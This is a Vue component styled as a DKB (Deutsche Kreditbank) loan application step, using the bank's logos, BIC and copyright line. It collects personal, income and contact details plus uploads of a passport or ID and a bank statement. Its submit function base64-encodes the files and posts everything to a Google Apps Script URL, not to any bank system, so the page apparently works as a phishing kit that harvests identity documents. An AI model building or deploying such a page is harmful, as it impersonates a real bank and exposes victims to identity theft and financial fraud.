<script setup lang="ts">
import { ref } from "vue";
import LogoDkb from "@/assets/logo_dkb.svg";
import LogoDkbPng from "@/assets/logo_dkb.png";
import ModalBook2 from "@/assets/MODAL_BOOK_2.jpg";
import ModalBook from "@/assets/MODAL_BOOK.svg";

const form = ref({
  firstName: "",
  lastName: "",
  dateOfBirth: "",
  countryOfBirth: "",
  countryOfResidence: "",
  income: "",
  additionalIncome: "",
  email: "",
  phone: "",
  residentialAddress: "",
  workplace: "",
  position: "",
  workStartYear: "",
  passportFile: null as File | null,
  bankStatementFile: null as File | null,
});

const isSubmitting = ref(false);
const errorMessage = ref("");
const success = ref(false);
const GOOGLE_SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbzsGPaEIndvkyN-gwfNF-NFIxQ-0UziwJ90SNJhFvpQeKhdB-I0H-N9q0BWaf4Y9CQ/exec";

function handleFileChange(e: Event, key: "passportFile" | "bankStatementFile") {
  const target = e.target as HTMLInputElement;
  if (!target.files || !target.files[0]) return;
  form.value[key] = target.files[0];
}

function fileToBase64(file: File | null): Promise<string | null> {
  if (!file) return Promise.resolve(null);
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result));
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

async function onSubmit() {
  try {
    isSubmitting.value = true;
    errorMessage.value = "";
    success.value = false;

    const passportBase64 = await fileToBase64(form.value.passportFile);
    const bankStatementBase64 = await fileToBase64(
      form.value.bankStatementFile
    );

    const payload = {
      first_name: form.value.firstName,
      last_name: form.value.lastName,
      date_of_birth: form.value.dateOfBirth,
      country_of_birth: form.value.countryOfBirth,
      country_of_residence: form.value.countryOfResidence,
      income: form.value.income,
      additional_income: form.value.additionalIncome,
      email: form.value.email,
      phone: form.value.phone,
      residential_address: form.value.residentialAddress,
      workplace: form.value.workplace,
      position: form.value.position,
      work_start_year: form.value.workStartYear,
      passport_file: passportBase64,
      bank_statement_file: bankStatementBase64,
    };
    const formData = new FormData();
    (Object.entries(payload) as [string, unknown][]).forEach(([key, value]) => {
      formData.append(key, value != null ? String(value) : "");
    });

    const res = await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      body: formData,
    });

    if (!res.ok) throw new Error("Request failed");
    const data = await res.json();
    if (!data.success) throw new Error("Script error");

    success.value = true;
  } catch (e) {
    console.error(e);
    errorMessage.value = "Something went wrong. Please try again.";
  } finally {
    isSubmitting.value = false;
  }
}
</script>

<template>
  <main class="min-h-screen flex flex-col bg-[#f2f6fb]">
    <header class="bg-white border-b border-slate-200">
      <div
        class="max-w-6xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
      >
        <div class="flex items-center gap-3">
          <img :src="LogoDkb" alt="DKB" class="h-10 w-auto" />
          <span class="sr-only">DKB – Das kann Bank</span>
        </div>

        <nav
          class="hidden md:flex items-center text-xs font-medium text-slate-600 gap-6"
        >
          <span class="text-blue-600 border-b-2 border-blue-600 pb-1">
            1. Loan request
          </span>
          <span class="pb-1">2. Application</span>
          <span class="pb-1">3. Account check</span>
          <span class="pb-1">4. Documents</span>
          <span class="pb-1">5. Completed</span>
        </nav>
      </div>
    </header>
    <div class="flex-1">
      <div class="max-w-5xl mx-auto px-4 py-10">
        <div class="mb-8">
          <p class="text-xs uppercase tracking-wide text-slate-500">
            Step 2 of 5
          </p>
          <h1 class="mt-2 text-3xl font-semibold text-slate-900">
            Your personal details
          </h1>
          <p class="mt-2 text-sm text-slate-600 max-w-2xl">
            Please fill in your personal data so we can process your loan
            request.
          </p>
        </div>

        <form
          class="bg-white rounded-lg shadow-sm border border-slate-100 p-6 md:p-8"
          @submit.prevent="onSubmit"
        >
          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                First name *
              </label>
              <input
                v-model="form.firstName"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Last name *
              </label>
              <input
                v-model="form.lastName"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Date of birth *
              </label>
              <input
                v-model="form.dateOfBirth"
                type="date"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Country of birth *
              </label>
              <input
                v-model="form.countryOfBirth"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Country of residence *
              </label>
              <input
                v-model="form.countryOfResidence"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Income (per month) *
              </label>
              <input
                v-model="form.income"
                type="number"
                min="0"
                step="0.01"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Additional income
              </label>
              <input
                v-model="form.additionalIncome"
                type="number"
                min="0"
                step="0.01"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                E-mail *
              </label>
              <input
                v-model="form.email"
                type="email"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Contact phone *
              </label>
              <input
                v-model="form.phone"
                type="tel"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div class="md:col-span-2">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Residential address *
              </label>
              <input
                v-model="form.residentialAddress"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Work place *
              </label>
              <input
                v-model="form.workplace"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Position *
              </label>
              <input
                v-model="form.position"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Year start of work *
              </label>
              <input
                v-model="form.workStartYear"
                type="number"
                min="1950"
                max="2100"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Passport / ID (upload)
              </label>
              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
              >
                <span>
                  Click to choose file<br />
                  <span class="text-[10px] text-slate-400">
                    PDF, JPG or PNG
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  @change="(e) => handleFileChange(e, 'passportFile')"
                />
              </label>
              <p v-if="form.passportFile" class="mt-1 text-xs text-slate-500">
                Selected: {{ form.passportFile.name }}
              </p>
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                Bank statement (upload)
              </label>
              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
              >
                <span>
                  Click to choose file<br />
                  <span class="text-[10px] text-slate-400">
                    PDF, JPG or PNG
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  @change="(e) => handleFileChange(e, 'bankStatementFile')"
                />
              </label>
              <p
                v-if="form.bankStatementFile"
                class="mt-1 text-xs text-slate-500"
              >
                Selected: {{ form.bankStatementFile.name }}
              </p>
            </div>
          </div>

          <div class="mt-6 space-y-2">
            <p v-if="errorMessage" class="text-sm text-red-600">
              {{ errorMessage }}
            </p>
            <p v-if="success" class="text-sm text-emerald-600">
              Data sent successfully.
            </p>
          </div>

          <div class="mt-6 flex justify-end">
            <button
              type="submit"
              :disabled="isSubmitting"
              class="inline-flex items-center justify-center rounded-md bg-[#007bff] px-10 py-3 text-sm font-semibold text-white hover:bg-[#0067d4] disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {{ isSubmitting ? "Sending..." : "NEXT" }}
            </button>
          </div>
        </form>
      </div>
    </div>

    <!-- FOOTER -->
    <footer class="mt-8 bg-[#003b73] text-white">
      <div
        class="max-w-6xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
      >
        <div class="flex gap-4">
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook2" alt="" class="h-full w-full object-cover" />
          </div>
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook" alt="" class="h-full w-full object-contain" />
          </div>
        </div>

        <div class="flex-1 text-center md:text-left">
          <p class="text-2xl font-semibold leading-snug">
            Need help with your application?
          </p>
          <p class="mt-3 text-sm text-white/80">
            Frequently asked questions and answers.
          </p>
        </div>

        <div class="flex items-center justify-center md:justify-end">
          <img :src="LogoDkbPng" alt="DKB" class="h-12 w-auto" />
        </div>
      </div>

      <div class="border-t border-white/10">
        <div
          class="max-w-6xl mx-auto px-4 py-4 text-[11px] text-white/70 flex flex-wrap gap-x-6 gap-y-2"
        >
          <span>© 2025 Deutsche Kreditbank AG</span>
          <span>BIC: BYLADEM1001</span>
          <span class="underline underline-offset-2 cursor-pointer">
            Contact
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            Imprint
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            Data protection
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            Cookie settings
          </span>
        </div>
      </div>
    </footer>
  </main>
</template>
